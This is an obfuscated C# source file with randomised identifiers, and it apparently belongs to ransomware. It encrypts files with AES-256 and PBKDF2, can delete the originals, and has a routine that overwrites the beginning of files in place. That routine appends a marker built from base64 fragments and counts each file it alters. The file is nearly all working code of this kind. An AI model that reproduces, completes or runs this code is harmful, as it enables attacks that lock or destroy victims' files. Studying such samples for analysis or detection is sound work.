using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace YzTymtbtgFABHvJvj;

public static class LPxPUxFbwbiz
{
	public const int oZqCxiudtC = 256;

	public static byte[] jyhSloGdZpgrbu(int MbrkvFxJznYD)
	{
		byte[] array = new byte[MbrkvFxJznYD];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool MDgoeiEhnnRx(string tINTPRkTfeYW, byte[] igjuPnlIbIg, bool ZhlBDDZnNyN)
	{
		byte[] array = jyhSloGdZpgrbu(16);
		using FileStream fileStream = new FileStream(tINTPRkTfeYW + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = kAQHFJZBVAgtUpN(igjuPnlIbIg, array);
		igjuPnlIbIg = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(tINTPRkTfeYW, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (ZhlBDDZnNyN)
			{
				File.Delete(tINTPRkTfeYW);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool CxoXeRNRBVrffnh(string hFgvgqJClOV, byte[] MqLmoWYUKCZ, bool vlyUEcthUIJr)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(hFgvgqJClOV, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = kAQHFJZBVAgtUpN(MqLmoWYUKCZ, array);
		MqLmoWYUKCZ = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(hFgvgqJClOV.Remove(hFgvgqJClOV.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] DJqnxaACLqbwV(byte[] dyzppzJJArxkj, byte[] KrARSvbqScdKvl, byte[] ZJBoQKAcgvMnLa)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = kAQHFJZBVAgtUpN(KrARSvbqScdKvl, ZJBoQKAcgvMnLa);
		KrARSvbqScdKvl = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(dyzppzJJArxkj, 0, dyzppzJJArxkj.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static byte[] ZlDiniYHVEe(byte[] VQOmizKidPuEcjjB, byte[] YrTPcrEyTik, byte[] QKYFJCeDJJfoA)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = kAQHFJZBVAgtUpN(YrTPcrEyTik, QKYFJCeDJJfoA);
		YrTPcrEyTik = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(VQOmizKidPuEcjjB, 0, VQOmizKidPuEcjjB.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static bool DJxGyncQWD(byte[] KkQzBgbizFECVesdi, byte[] PVrmFOUftHaMt, byte[] KDfuQIZmobzm)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = kAQHFJZBVAgtUpN(KkQzBgbizFECVesdi, PVrmFOUftHaMt);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(KDfuQIZmobzm);
	}

	public static Rfc2898DeriveBytes kAQHFJZBVAgtUpN(byte[] KjAWNqxyZCsAc, byte[] jhAHbnrFTKwEu)
	{
		return new Rfc2898DeriveBytes(KjAWNqxyZCsAc, jhAHbnrFTKwEu, 52768);
	}

	public static byte[] IXQbjATPSfee(string TBiwAVNDarByLCsp, int iqxPObtbswakYj)
	{
		byte[] array = new byte[iqxPObtbswakYj];
		try
		{
			if (eqCksjvMyn.BHMRzZEpeyy == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(TBiwAVNDarByLCsp, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, iqxPObtbswakYj);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(TBiwAVNDarByLCsp, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, iqxPObtbswakYj);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (eqCksjvMyn.nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(eqCksjvMyn.zRTqZqtXid, "File: " + TBiwAVNDarByLCsp + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream = new FileStream(TBiwAVNDarByLCsp, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, iqxPObtbswakYj);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
	}

	public static bool vNGqufskYtzV(string RTZZWNJCGwYa, byte[] qsGNXaukFrpn, byte[] TCvcLhMGOtwKlg = null)
	{
		try
		{
			byte[] array = null;
			if (eqCksjvMyn.BHMRzZEpeyy == "YES")
			{
				array = (eqCksjvMyn.zzEQfIIuvgiBbM ? Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni(eqCksjvMyn.hOBSsVzXhREJ) + eqCksjvMyn.joRKfFeYni("Kw==") + Convert.ToString(eqCksjvMyn.oIPxacaZFPrUD) + eqCksjvMyn.joRKfFeYni("Kw==")) : (eqCksjvMyn.IUeXbBJIfNgWuv ? Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni("RWNjU2ln") + eqCksjvMyn.joRKfFeYni("LQ==") + Convert.ToString(eqCksjvMyn.oIPxacaZFPrUD) + eqCksjvMyn.joRKfFeYni("LQ==")) : Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni(eqCksjvMyn.hOBSsVzXhREJ) + eqCksjvMyn.joRKfFeYni("LQ==") + Convert.ToString(eqCksjvMyn.oIPxacaZFPrUD) + eqCksjvMyn.joRKfFeYni("LQ=="))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(RTZZWNJCGwYa, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(qsGNXaukFrpn, 0, qsGNXaukFrpn.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(RTZZWNJCGwYa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!eqCksjvMyn.zzEQfIIuvgiBbM)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(TCvcLhMGOtwKlg, 0, TCvcLhMGOtwKlg.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (eqCksjvMyn.zzEQfIIuvgiBbM ? Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni(eqCksjvMyn.hOBSsVzXhREJ) + eqCksjvMyn.joRKfFeYni("Kw==") + Convert.ToString(eqCksjvMyn.oIPxacaZFPrUD) + eqCksjvMyn.joRKfFeYni("Kw==")) : (eqCksjvMyn.IUeXbBJIfNgWuv ? Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni("RWNjU2ln") + eqCksjvMyn.joRKfFeYni("LQ==") + Convert.ToString(eqCksjvMyn.oIPxacaZFPrUD) + eqCksjvMyn.joRKfFeYni("LQ==")) : Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni(eqCksjvMyn.hOBSsVzXhREJ) + eqCksjvMyn.joRKfFeYni("LQ==") + Convert.ToString(eqCksjvMyn.oIPxacaZFPrUD) + eqCksjvMyn.joRKfFeYni("LQ=="))));
				FileStream fileStream2 = new FileStream(RTZZWNJCGwYa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(qsGNXaukFrpn, 0, qsGNXaukFrpn.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream = new FileStream(RTZZWNJCGwYa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!eqCksjvMyn.zzEQfIIuvgiBbM)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(TCvcLhMGOtwKlg, 0, TCvcLhMGOtwKlg.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			eqCksjvMyn.UrQRBEHxUHKK++;
		}
		catch (Exception ex)
		{
			if (eqCksjvMyn.nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(eqCksjvMyn.zRTqZqtXid, "File: " + RTZZWNJCGwYa + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array = null;
				array = (eqCksjvMyn.zzEQfIIuvgiBbM ? Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni(eqCksjvMyn.hOBSsVzXhREJ) + eqCksjvMyn.joRKfFeYni("Kw==") + Convert.ToString(eqCksjvMyn.oIPxacaZFPrUD) + eqCksjvMyn.joRKfFeYni("Kw==")) : (eqCksjvMyn.IUeXbBJIfNgWuv ? Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni("RWNjU2ln") + eqCksjvMyn.joRKfFeYni("LQ==") + Convert.ToString(eqCksjvMyn.oIPxacaZFPrUD) + eqCksjvMyn.joRKfFeYni("LQ==")) : Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni(eqCksjvMyn.hOBSsVzXhREJ) + eqCksjvMyn.joRKfFeYni("LQ==") + Convert.ToString(eqCksjvMyn.oIPxacaZFPrUD) + eqCksjvMyn.joRKfFeYni("LQ=="))));
				FileStream fileStream2 = new FileStream(RTZZWNJCGwYa, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(qsGNXaukFrpn, 0, qsGNXaukFrpn.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using (FileStream fileStream = new FileStream(RTZZWNJCGwYa, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!eqCksjvMyn.zzEQfIIuvgiBbM)
					{
						fileStream.Write(array, 0, array.Length);
					}
					else
					{
						fileStream.Write(TCvcLhMGOtwKlg, 0, TCvcLhMGOtwKlg.Length);
						fileStream.Write(array, 0, array.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}
}
